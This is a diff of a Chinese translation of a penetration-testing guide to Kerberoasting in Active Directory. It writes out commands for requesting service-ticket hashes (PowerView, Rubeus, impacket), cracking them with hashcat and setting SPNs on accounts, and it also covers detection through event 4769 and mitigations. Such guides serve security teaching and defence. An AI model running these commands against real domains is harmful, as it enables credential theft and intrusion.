@@ -1,6 +1,6 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)来轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
@@ -10,36 +10,36 @@
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-支持HackTricks的其他方式：
+支持 HackTricks 的其他方式：
 
-* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 PDF 版本的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上关注我们**。
+* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
 
 </details>
 
 ## Kerberoast
 
-Kerberoast专注于获取**TGS票据**，特别是那些在**Active Directory (AD)**下以**用户帐户**运行的服务相关的票据，排除**计算机帐户**。这些票据的加密使用源自**用户密码**的密钥，从而可能导致**离线凭据破解**。将用户帐户用作服务的情况由非空的**"ServicePrincipalName"**属性表示。
+Kerberoast 专注于获取与**Active Directory (AD)** 中以**用户帐户**运行的服务相关的**TGS 票证**。这些票证的加密使用源自**用户密码**的密钥，从而可能导致**离线凭据破解**。将用户帐户用作服务的情况由非空的**"ServicePrincipalName"**属性表示。
 
-要执行**Kerberoasting**，需要一个能够请求**TGS票据**的域帐户；然而，这个过程并不需要**特殊权限**，因此任何具有**有效域凭据**的人都可以访问。
+要执行**Kerberoast**，需要一个能够请求**TGS 票证**的域帐户；然而，此过程不需要**特殊权限**，因此任何具有**有效域凭据**的人都可以访问。
 
 ### 关键要点：
 
-* **Kerberoasting**针对**AD**中的**用户帐户服务**的**TGS票据**。
-* 使用**用户密码**生成的密钥加密的票据可以**离线破解**。
+* **Kerberoast** 针对**AD** 中的**用户帐户服务**的**TGS 票证**。
+* 使用**用户密码**生成的密钥加密的票证可以**离线破解**。
 * 服务由非空的**ServicePrincipalName**标识。
-* 不需要**特殊权限**，只需**有效的域凭据**。
+* 只需**有效的域凭据**，无需**特殊权限**。
 
 ### **攻击**
 
 {% hint style="warning" %}
-**Kerberoasting工具**通常在执行攻击并发起TGS-REQ请求时请求**`RC4加密`**。这是因为**RC4**比其他加密算法如AES-128和AES-256更容易**离线破解**，可以使用Hashcat等工具进行破解。\
-RC4（类型23）哈希以**`$krb5tgs$23$*`**开头，而AES-256（类型18）以**`$krb5tgs$18$*`**开头。
+**Kerberoast 工具**通常在执行攻击并发起 TGS-REQ 请求时请求**`RC4 加密`**。这是因为**RC4**比其他加密算法如 AES-128 和 AES-256 更容易**离线破解**，可使用 Hashcat 等工具。\
+RC4（类型 23）哈希以**`$krb5tgs$23$*`**开头，而 AES-256（类型 18）以**`$krb5tgs$18$*`**开头。
 {% endhint %}
 
 #### **Linux**
@@ -87,7 +87,7 @@ python2.7 kirbi2john.py sqldev.kirbi
 # Transform john to hashcat
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
-* **技术 2: 自动工具**
+* **技术 2: 自动化工具**
 ```bash
 # Powerview: Get Kerberoast hash of a user
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
@@ -107,7 +107,7 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 当请求TGS时，Windows事件`4769 - 请求了一个Kerberos服务票证`会被生成。
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和**自动化工作流**，利用世界上**最先进**的社区工具。\
@@ -127,16 +127,16 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-您可以在这里找到用于**kerberoast**攻击的有用**工具**：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+您可以在这里找到有用的**kerberoast**攻击**工具**：[https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-如果您在Linux上遇到此**错误**：**`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**，这是由于您的本地时间，您需要将主机与DC同步。有几种选项：
+如果您在Linux中遇到此**错误**：**`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**，这是由于本地时间不同步，您需要将主机与DC同步。有几种选择：
 
 * `ntpdate <DC的IP>` - 自Ubuntu 16.04起已弃用
 * `rdate -n <DC的IP>`
 
 ### 缓解
 
-如果可以利用，Kerberoasting可以以高度隐蔽性进行。为了检测此活动，应注意**安全事件ID 4769**，该事件指示已请求Kerberos票证。但是，由于此事件的高频率，必须应用特定过滤器以隔离可疑活动：
+如果可以利用，**kerberoasting**可以以高度隐蔽性进行。为了检测此活动，应注意**安全事件ID 4769**，该事件指示已请求Kerberos票证。但是，由于此事件的高频率，必须应用特定过滤器以隔离可疑活动：
 
 * 服务名称不应为**krbtgt**，因为这是正常请求。
 * 应排除以**$**结尾的服务名称，以避免包括用于服务的机器帐户。
@@ -148,14 +148,14 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 ```
 为了减轻Kerberoasting的风险：
 
-- 确保**服务账户密码难以猜测**，建议长度超过**25个字符**。
-- 使用**托管服务账户**，提供诸如**自动更改密码**和**委派服务主体名称（SPN）管理**等好处，增强对此类攻击的安全性。
+* 确保**服务账户密码难以猜测**，建议长度超过**25个字符**。
+* 使用**托管服务账户**，提供诸如**自动更改密码**和**委派服务主体名称（SPN）管理**等好处，增强对此类攻击的安全性。
 
 通过实施这些措施，组织可以显著降低与Kerberoasting相关的风险。
 
 ## 不使用域账户的Kerberoast
 
-在**2022年9月**，研究人员Charlie Clark提出了一种新的利用系统的方法，通过他的平台[exploit.ph](https://exploit.ph/)分享。这种方法允许通过**KRB\_AS\_REQ**请求获取**服务票证（ST）**，而无需控制任何Active Directory账户。基本上，如果一个主体被设置成不需要预身份验证，类似于网络安全领域中所知的**AS-REP Roasting攻击**，则可以利用这种特性来操纵请求过程。具体来说，通过修改请求主体中的**sname**属性，系统会被欺骗发出**ST**，而不是标准的加密票证授予票证（TGT）。
+在**2022年9月**，一位名为Charlie Clark的研究人员通过他的平台[exploit.ph](https://exploit.ph/)分享了一种利用系统的新方法。这种方法允许通过**KRB\_AS\_REQ**请求获取**服务票证（ST）**，而无需控制任何Active Directory账户。基本上，如果一个主体被设置成不需要预身份验证，类似于在网络安全领域中所知的**AS-REP Roasting攻击**，则可以利用这种特性来操纵请求过程。具体来说，通过修改请求体中的**sname**属性，系统会被欺骗发出**ST**而不是标准的加密票据授予票证（TGT）。
 
 该技术在这篇文章中得到了全面解释：[Semperis博客文章](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。
 
@@ -165,10 +165,14 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 #### Linux
 
-- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
+* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
+#### Windows
+
+* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139): 
+
 #### Windows
 
 * [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
@@ -183,22 +187,22 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 支持HackTricks的其他方式：
 
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
 * **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我们。
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
+使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，利用世界上**最先进**的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
